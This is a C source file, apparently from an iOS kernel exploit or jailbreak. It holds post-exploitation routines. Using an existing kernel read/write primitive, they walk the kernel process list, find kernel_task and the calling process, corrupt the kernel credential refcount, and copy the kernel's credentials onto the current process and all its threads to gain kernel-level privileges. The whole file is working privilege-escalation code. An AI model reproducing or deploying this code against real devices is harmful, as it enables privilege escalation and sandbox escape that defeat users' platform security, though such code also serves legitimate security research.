#include "offsets.h"
#include "rwx.h"
#include "Utilities.h"

#include <stdlib.h>
#include <stdio.h>
#define MAX_PROCESSES_IN_SYSTEM							(0xffff)

/*
 * Function name: 	post_exploit_set_cred_for_all_threads
 * Description:		Overwrites the creds of all the threads belonging to the same proc.
 * Returns:			kern_return_t.
 */

static
kern_return_t post_exploit_set_cred_for_all_threads(uint64_t thread, uint64_t creds) {
	
	kern_return_t ret = KERN_SUCCESS;
	uint64_t thread_next = 0;
	if (thread != 0)
	{
		do {
			/* update thread's cred */
			ret = rwx_write(thread + OFFSET(struct_uthread_uu_ucred), &creds, sizeof(creds));
			if (KERN_SUCCESS != ret)
			{
				printf("[ERROR]: Error replacing credentials for thread!\n");
				goto cleanup;
			} else {
				printf("[INFO]: Replaced credentials for thread\n");
			}

			ret = rwx_read(thread + OFFSET(struct_uthread_uu_list), &thread_next, sizeof(thread_next));
			if (KERN_SUCCESS != ret)
			{
				printf("[ERROR]: Failed reading next thread!\n");
				goto cleanup;
			} else {
				printf("[INFO]: next thread: %p\n", (void*)thread_next);
			}

			thread = thread_next;

		}while(0 != thread_next);
	}

cleanup:
	return ret;
}



/*
 * Function name: 	post_exploit_copy_cred
 * Description:		Copies the credentials from one proc to another.
 * Returns:			kern_return_t.
 */

static
kern_return_t post_exploit_copy_cred(uint64_t proc_from, uint64_t proc_to) {
	
	kern_return_t ret = KERN_SUCCESS;
	unsigned long creds_from = 0;
	unsigned long new_credentials_refcount = 0x444444;
	unsigned long uthread = 0;

	ret = rwx_read(proc_from + OFFSET(struct_proc_p_ucred), &creds_from, sizeof(creds_from));
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: Error reading STRUCT_PROC_P_UCRED_OFFSET\n");
	} else {
		printf("[INFO]: kernel_creds: %p\n", (void*)creds_from);
	}

	printf("[INFO]: leaking kernel creds' refcount...\n");

	/* leak creds */
	ret = rwx_write(creds_from + OFFSET(struct_kauth_cred_cr_ref), &new_credentials_refcount, sizeof(new_credentials_refcount));
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: Error leaking credentials!\n");
		goto cleanup;
	} else { 
		printf("[INFO]: Successfully leaked credentials!\n");
	}

	printf("[INFO]: replacing credentials...\n");

	/* replace proc_to's credentials pointer with proc_from's credentials pointer */
	ret = rwx_write(proc_to + OFFSET(struct_proc_p_ucred), &creds_from, sizeof(creds_from));
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: Error replacing credentials!\n");
		goto cleanup;
	} else {
		printf("[INFO]: Successfully replaced credentials!\n");
	}

	printf("[INFO]: replacing cached credentials...\n");

	/* replace cached credentials */
	ret = rwx_read(proc_to + OFFSET(struct_proc_p_uthlist), &uthread, sizeof(uthread));
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: Error reading thread list\n");
		goto cleanup;
	} else {
		printf("[INFO]: uthread: %p\n", (void*)uthread);
	}

	ret = post_exploit_set_cred_for_all_threads((uint64_t)uthread, (uint64_t)creds_from);

cleanup:
	return ret;
}



/*
 * Function name: 	post_exploit_find_proc
 * Description:		Finds the 'proc' of the process name proc_name.
 * Returns:			kern_return_t and proc in output params.
 */

static
kern_return_t post_exploit_find_proc(const char * proc_name, uint64_t * proc_out) {
	
	kern_return_t ret = KERN_SUCCESS;
	unsigned long proc = 0, next_proc = 0;
	unsigned int i = 0;
	char current_proc_name[16] = {0};
	ret = rwx_read((uint64_t)(offsets_get_kernel_base() + OFFSET(all_proc)), &proc, sizeof(proc));
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: error reading allproc\n");
	}
	else { 
		printf("[INFO]: allproc: %p\n", (void*)proc);
	}

	for(i = 0; i < MAX_PROCESSES_IN_SYSTEM; ++i) {
		memset(current_proc_name, 0, sizeof(current_proc_name));

		ret = rwx_read((uint64_t)(proc + OFFSET(struct_proc_p_comm)), current_proc_name, sizeof(current_proc_name));
		if (KERN_SUCCESS != ret)
		{
			printf("[ERROR]: failed reading process name %d\n", i);
			goto cleanup;
		}

		printf("[INFO]: iterating process name: %s\n", current_proc_name);

		if (strstr(current_proc_name, proc_name))
		{
			*proc_out = (uint64_t)proc;
			goto cleanup;
		}

		ret = rwx_read((uint64_t)proc, &next_proc, sizeof(next_proc));
		if (KERN_SUCCESS != ret)
		{
			printf("[ERROR]: error reading next_proc\n");
			goto cleanup;
		}

		proc = next_proc;
	}

cleanup:
	return ret;

}



/*
 * Function name: 	post_exploit_get_kernel_creds
 * Description:		Updates the credentials of the current process to the kernel's credentials.
 * Returns:			kern_return_t.
 */

kern_return_t post_exploit_get_kernel_creds() {
	
	kern_return_t ret = KERN_SUCCESS;
	uint64_t kern_proc = 0;
	uint64_t self_proc = 0;
    uint64_t kernel_task_proc = 0;
    uint64_t containermanager = 0;

	ret = rwx_read(offsets_get_kernel_base() + OFFSET(kern_proc), (unsigned long*)&kern_proc, sizeof(kern_proc));
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: error reading kern_proc\n");
		goto cleanup;
	}

	printf("[INFO]: kern_proc: 0x%llx\n", kern_proc);

	ret = post_exploit_find_proc(getprogname(), &self_proc);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: error getting self proc\n");
		goto cleanup;
	}

	printf("[INFO]: self_proc: 0x%llx\n", self_proc);
    
    uint32_t our_pid = 0;
    rwx_read(self_proc + offsetof_p_pid, &our_pid, sizeof(our_pid));
    printf("[INFO]: our pid: %d\n", (int)our_pid);
    
    uint32_t our_task = 0;
    rwx_read(self_proc + offsetof_task, &our_task, sizeof(our_task));
    printf("[INFO]: our task: %x", our_task);
    

    // kernel_task
    ret = post_exploit_find_proc("kernel_task", &kernel_task_proc);
    if (KERN_SUCCESS != ret)
    {
        printf("[ERROR]: error getting kernel_task proc\n");
        goto cleanup;
    }
    
    uint32_t kernel_task = 0;
    rwx_read(kernel_task_proc + offsetof_task, &kernel_task, sizeof(kernel_task));
    printf("[INFO]: kernel_task proc: %llx\n", kernel_task_proc);
    printf("[INFO]: kernel_task: %x\n", kernel_task);
    
    ret = post_exploit_find_proc("containermanager", &containermanager);
    if (KERN_SUCCESS != ret)
    {
        printf("[ERROR]: error getting containermanager\n");
        goto cleanup;
    }
    
    printf("[INFO]: containermanager: 0x%llx\n", containermanager);
    set_procs(self_proc, kern_proc, containermanager);

	ret = post_exploit_copy_cred(kern_proc, self_proc);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: error copying creds from kernel to us\n");
		goto cleanup;
	}


cleanup:
	return ret;
}

